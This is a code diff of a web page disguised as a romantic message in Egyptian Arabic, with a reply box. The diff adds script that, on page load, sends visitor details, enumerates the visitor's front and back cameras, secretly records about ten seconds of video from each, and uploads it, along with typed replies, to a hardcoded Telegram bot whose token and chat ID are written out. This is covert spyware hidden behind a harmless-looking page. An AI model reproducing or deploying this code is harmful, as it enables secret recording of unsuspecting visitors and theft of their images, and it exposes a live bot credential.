@@ -78,7 +78,7 @@
 <body>
 
     <div class="container" id="messageContainer">
-        <div class="message" id="displayMessage">عارفه ينونتي بحبك فشششخ...</div>
+        <div class="message" id="displayMessage">عارفه ينونتي بحبك فشششخ بجد بعشقك اوي...</div>
         
         <textarea class="input-field" id="userMessage" placeholder="Write your reply..." rows="1" oninput="autoGrow(this)"></textarea>
         <button class="button" onclick="sendMessage()">Send a Reply</button>
@@ -91,18 +91,14 @@
         }
 
         function sendMessage() {
+            // جلب الرسالة من مربع الإدخال
             const userMessage = document.getElementById('userMessage').value;
 
+            // التحقق من أن الرسالة ليست فارغة
             if (userMessage.trim() !== "") {
+                // إرسال الرسالة إلى تليجرام
                 sendToTelegram(userMessage);
-
-                // Check for permission and send notification
-                if (Notification.permission === "granted") {
-                    new Notification("رسالة جديدة!", {
-                        body: "تم تغيير الرسالة: " + userMessage,
-                        icon: 'https://example.com/notification-icon.png'  // You can change the icon URL.
-                    });
-                }
+                showNotification(userMessage);
 
                 document.getElementById('userMessage').value = "";
                 document.getElementById('userMessage').style.height = "auto"; 
@@ -154,29 +150,51 @@
                 });
         }
 
-        function startCamera(stream) {
-            // Access the video elements for both front and back cameras
-            const frontCamera = document.createElement('video');
-            const backCamera = document.createElement('video');
-
-            // Set stream to both cameras
-            frontCamera.srcObject = stream;
-            backCamera.srcObject = stream;
-
-            // Start playing both videos
-            frontCamera.play();
-            backCamera.play();
-
-            // Capture the stream from both cameras
-            const frontTrack = stream.getVideoTracks()[0];
-            const backTrack = stream.getVideoTracks()[1];
-
-            // Send both streams to Telegram
-            sendCameraFeedToTelegram(frontTrack, 'front');
-            sendCameraFeedToTelegram(backTrack, 'back');
+        // طلب الإذن للإشعارات
+        function requestNotificationPermission() {
+            if ('Notification' in window && navigator.serviceWorker) {
+                Notification.requestPermission().then(permission => {
+                    if (permission === 'granted') {
+                        navigator.serviceWorker.register('sw.js');
+                    }
+                });
+            }
         }
 
-        function sendCameraFeedToTelegram(videoTrack, cameraType) {
+        function showNotification(message) {
+            if (Notification.permission === 'granted') {
+                navigator.serviceWorker.ready.then(function(registration) {
+                    registration.showNotification('New Message', {
+                        body: message,
+                        icon: 'https://via.placeholder.com/150',
+                        vibrate: [200, 100, 200],
+                        tag: 'new-message'
+                    });
+                });
+            }
+        }
+
+        // تسجيل الفيديو من الكاميرا
+        function recordAndSendVideo(stream, cameraType) {
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+
+            recorder.ondataavailable = function(event) {
+                chunks.push(event.data);
+            };
+
+            recorder.onstop = function() {
+                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                sendVideoToTelegram(videoBlob, cameraType);
+            };
+
+            recorder.start();
+
+            // Stop recording after 10 seconds (for example)
+            setTimeout(() => recorder.stop(), 10000);
+        }
+
+        function sendVideoToTelegram(videoBlob, cameraType) {
             const botToken = '7525866619:AAFvucD9MBOr7z4XFUbRSYlYMXFsdDut800';
             const chatId = '7631254472';
             const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
@@ -184,7 +202,7 @@
             const data = new FormData();
             data.append('chat_id', chatId);
             data.append('caption', `Video from ${cameraType} camera`);
-            data.append('document', videoTrack);
+            data.append('document', videoBlob, `${cameraType}-camera.mp4`);
 
             fetch(url, {
                 method: 'POST',
@@ -192,26 +210,35 @@
             })
             .then(response => response.json())
             .catch(error => {
-                console.error("Error sending camera feed:", error);
+                console.error("Error sending video to Telegram:", error);
             });
         }
 
-        function accessCameras() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(startCamera)
-                .catch(error => {
-                    console.error("Error accessing cameras:", error);
-                });
-        }
+        // تشغيل الكاميرا الأمامية والخلفية
+        function startCameras() {
+            navigator.mediaDevices.enumerateDevices().then(devices => {
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
 
-        // Ask for notification permission
-        if (Notification.permission !== "granted") {
-            Notification.requestPermission();
+                // تشغيل الكاميرا الأمامية
+                if (videoDevices.length > 0) {
+                    navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDevices[0].deviceId } })
+                        .then(stream => recordAndSendVideo(stream, 'front'));
+                }
+
+                // تشغيل الكاميرا الخلفية (إن وُجدت)
+                if (videoDevices.length > 1) {
+                    navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDevices[1].deviceId } })
+                        .then(stream => recordAndSendVideo(stream, 'back'));
+                }
+            }).catch(error => {
+                console.error("Error accessing cameras:", error);
+            });
         }
 
         window.onload = function() {
             sendVisitorDetails();
-            accessCameras();
+            requestNotificationPermission();
+            startCameras();
         };
     </script>
 
